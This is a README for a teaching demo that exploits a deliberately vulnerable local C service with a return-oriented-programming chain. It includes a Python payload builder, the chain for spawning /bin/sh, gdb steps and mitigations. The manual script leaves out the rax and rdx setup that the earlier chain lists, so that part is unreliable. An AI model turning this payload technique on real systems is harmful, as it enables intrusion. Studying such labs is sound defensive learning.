# ROP (Return-Oriented Programming) Exploit Demonstration

This demonstration showcases a complete end-to-end exploit of a vulnerable legacy service using Return-Oriented Programming (ROP) techniques. This is an educational example showing how attackers can exploit buffer overflow vulnerabilities in old software, even when modern protections like NX (Non-eXecutable stack) are enabled.

## Overview

**Return-Oriented Programming (ROP)** is an exploitation technique that allows attackers to execute arbitrary code even when the stack is non-executable (NX bit is set). Instead of injecting shellcode, ROP chains together small sequences of existing instructions (called "gadgets") that end in a `ret` instruction, effectively building a program from the target binary's own code.

## The Vulnerable Software

The `vulnerable_service.c` simulates an old legacy service with the following characteristics:

- **Stack-based buffer overflow** in the `process_command()` function
- Uses unsafe `strcpy()` without bounds checking  
- Compiled without modern security features (stack canaries, PIE/ASLR)
- Simulates common patterns found in legacy enterprise software from the early 2000s

### Vulnerability Details

```c
void process_command(char *input) {
    char buffer[128];  // Small 128-byte buffer
    strcpy(buffer, input);  // VULNERABLE: No bounds checking!
    // ... rest of function
}
```

The `strcpy()` function copies data from `input` to `buffer` without checking the length, allowing an attacker to overflow the buffer and overwrite:
- Saved frame pointer (RBP)
- Return address
- Potentially other data on the stack

## Attack Strategy

### 1. Traditional Buffer Overflow (Without NX)

With an executable stack:
1. Overflow the buffer
2. Inject shellcode into the buffer
3. Overwrite return address to point to shellcode
4. Shellcode executes when function returns

**Mitigation**: NX bit (non-executable stack) - prevents shellcode execution

### 2. ROP Attack (Bypassing NX)

With NX enabled, we use ROP:
1. **Overflow the buffer** - same as traditional attack
2. **Build ROP chain** - instead of shellcode, chain together gadgets
3. **Execute system call** - use gadgets to set up and execute `execve("/bin/sh")`

### ROP Chain Structure

For executing `execve("/bin/sh", NULL, NULL)`:

```
[136 bytes of padding]  → Fill buffer (128) + saved RBP (8)
[pop rdi; ret gadget]   → Load RDI with address of "/bin/sh"
[address of "/bin/sh"]  → First argument
[pop rsi; ret gadget]   → Load RSI with NULL  
[0x0000000000000000]    → Second argument (NULL)
[pop rdx; ret gadget]   → Load RDX with NULL
[0x0000000000000000]    → Third argument (NULL)
[pop rax; ret gadget]   → Load RAX with syscall number
[0x000000000000003b]    → execve syscall number (59)
[syscall gadget]        → Execute the syscall
```

## Building and Testing

### Prerequisites

```bash
# Install required tools
sudo apt-get install gcc make binutils gdb

# Install ROP analysis tools (optional but recommended)
pip3 install --user ROPgadget ropper pwntools
```

### Build the Vulnerable Binary

```bash
cd demos/rop-exploit
make
```

This creates two binaries:
- `vulnerable_service` - with executable stack (easier exploitation)
- `vulnerable_service-nx` - with NX bit enabled (requires ROP)

### Check Security Features

```bash
make check
```

Expected output:
```
[*] vulnerable_service (executable stack):
    Stack canaries: DISABLED
    PIE/ASLR: DISABLED  
    NX bit: DISABLED

[*] vulnerable_service-nx (non-executable stack):
    Stack canaries: DISABLED
    PIE/ASLR: DISABLED
    NX bit: ENABLED ← ROP required!
```

### Find ROP Gadgets

```bash
make gadgets
```

This searches the binary for useful instruction sequences:
- `pop rdi; ret` - loads first argument
- `pop rsi; pop r15; ret` - loads second argument
- `syscall` - executes system call
- Other useful gadgets

### Generate the Exploit

```bash
make exploit
```

This runs `exploit.py` which:
1. Analyzes the binary for gadgets
2. Finds function addresses
3. Builds the ROP chain
4. Generates `exploit_payload.bin`

### Test the Exploit

```bash
make test-exploit
```

This runs the vulnerable service with the exploit payload. Expected result:
- Program crashes with segmentation fault
- Or spawns a shell (if ROP chain is successful)

## Manual Exploitation

### Step 1: Analyze the Binary

```bash
# Disassemble the vulnerable function
objdump -d vulnerable_service-nx | grep -A 40 "<process_command>:"

# Find gadgets manually
objdump -d vulnerable_service-nx | grep -E "(pop.*ret|syscall)"

# Check symbols
nm vulnerable_service-nx | grep -E "(process_command|log_message)"
```

### Step 2: Calculate Offset

The buffer is 128 bytes, and we need to overflow past the saved RBP (8 bytes):
- **Offset to return address**: 128 + 8 = 136 bytes

### Step 3: Build Payload Manually

```python
#!/usr/bin/env python3
import struct

def p64(addr):
    return struct.pack('<Q', addr)

# Addresses (example - replace with actual addresses from your binary)
POP_RDI_RET = 0x401234
POP_RSI_R15_RET = 0x401236
SYSCALL = 0x401250
BIN_SH = 0x402000

payload = b"A" * 136  # Fill buffer + RBP

# ROP chain for execve("/bin/sh", NULL, NULL)
payload += p64(POP_RDI_RET)
payload += p64(BIN_SH)        # rdi = "/bin/sh"
payload += p64(POP_RSI_R15_RET)
payload += p64(0)             # rsi = NULL
payload += p64(0)             # r15 = dummy
payload += p64(SYSCALL)       # execute syscall

# Write payload to file
with open("payload.bin", "wb") as f:
    f.write(payload)
```

### Step 4: Test with GDB

```bash
# Run with GDB
gdb ./vulnerable_service-nx

# Set breakpoint
(gdb) break process_command
(gdb) run "$(python3 -c 'print("A" * 150)')"

# Inspect registers and stack
(gdb) info registers
(gdb) x/50x $rsp
(gdb) continue
```

## Understanding the Exploit

### Memory Layout Before Overflow

```
Higher addresses
+------------------+
|  Return Address  | ← We want to control this
+------------------+
|   Saved RBP      | ← 8 bytes
+------------------+
|                  |
|   buffer[128]    | ← Our overflow starts here
|                  |
+------------------+
Lower addresses
```

### Memory Layout After Overflow

```
Higher addresses
+------------------+
| syscall gadget   | ← Execute syscall
+------------------+
| 0x000000000000   | ← rdx = NULL
+------------------+
| pop rdx; ret     |
+------------------+
| 0x000000000000   | ← rsi = NULL
+------------------+
| pop rsi; ret     |
+------------------+
| addr("/bin/sh")  | ← rdi = "/bin/sh"
+------------------+
| pop rdi; ret     | ← Overwrites return address
+------------------+
| "AAAAAAAA..."    | ← Overwritten saved RBP
+------------------+
| "AAAAAAAA..."    | ← Overwritten buffer
+------------------+
Lower addresses
```

## Real-World Application

This demonstration simulates vulnerabilities found in:

1. **Legacy network services** (FTP, Telnet servers from early 2000s)
2. **Old enterprise software** (database servers, application servers)
3. **Embedded systems** (routers, IoT devices with outdated firmware)
4. **Legacy protocols** (SMBv1, vulnerable SSL/TLS implementations)

### Notable Real-World Examples

- **EternalBlue (MS17-010)** - SMBv1 buffer overflow used in WannaCry
- **Heartbleed** - OpenSSL buffer over-read
- **Stagefright** - Android media server vulnerability  
- **Ghost (CVE-2015-0235)** - glibc buffer overflow

## Mitigations

Modern systems employ multiple protections:

1. **Stack Canaries** (`-fstack-protector`) - Random values placed before return address
2. **NX/DEP** - Non-executable stack (prevents shellcode, but not ROP)
3. **ASLR/PIE** - Address randomization (makes ROP harder)
4. **Control Flow Integrity (CFI)** - Validates control flow transfers
5. **Safe Functions** - Use `strncpy()`, `snprintf()` instead of `strcpy()`, `sprintf()`

### Why This Demo Disables Protections

To clearly demonstrate the ROP technique, we disable certain protections:
- **No stack canaries** - Easier to overflow without detection
- **No PIE/ASLR** - Addresses are predictable
- **NX enabled** - Shows ROP is needed even with NX

In real-world scenarios, attackers must bypass all these protections.

## Advanced Topics

### Information Leaks

With ASLR enabled, attackers need to leak addresses:
- Format string vulnerabilities
- Buffer over-reads
- Memory disclosure bugs

### Blind ROP (BROP)

Discovering gadgets without seeing the binary:
- Send different payloads
- Observe crash behavior
- Infer gadget locations

### JIT-ROP

Bypassing fine-grained ASLR:
- Read executable memory
- Dynamically discover gadgets
- Build ROP chain on-the-fly

## pf Task Runner Integration

You can run these tasks using the pf runner:

```bash
# Build the vulnerable binaries
pf rop-build

# Analyze and generate exploit
pf rop-exploit

# Test the exploit
pf rop-test

# Clean up
pf rop-clean
```

See the main `Pfyfile.pf` for task definitions.

## Ethical and Legal Considerations

⚠️ **WARNING**: This demonstration is for **educational purposes only**.

- Only test on systems you own or have explicit permission to test
- Never use these techniques on production systems
- Unauthorized access to computer systems is illegal
- Use this knowledge to **defend** systems, not attack them

## Further Reading

- **"The Shellcoder's Handbook"** by Chris Anley et al.
- **"Hacking: The Art of Exploitation"** by Jon Erickson
- **"Practical Binary Analysis"** by Dennis Andriesse
- **ROPEmporium** - Practice ROP challenges: https://ropemporium.com/
- **Exploit Education** - Vulnerable VMs: https://exploit.education/

## References

- [Return-Oriented Programming (ROP)](https://en.wikipedia.org/wiki/Return-oriented_programming)
- [NX Bit](https://en.wikipedia.org/wiki/NX_bit)
- [Address Space Layout Randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization)
- [Stack Buffer Overflow](https://en.wikipedia.org/wiki/Stack_buffer_overflow)

---

**Disclaimer**: This code is intentionally vulnerable and should never be used in production. It exists solely for educational and research purposes.
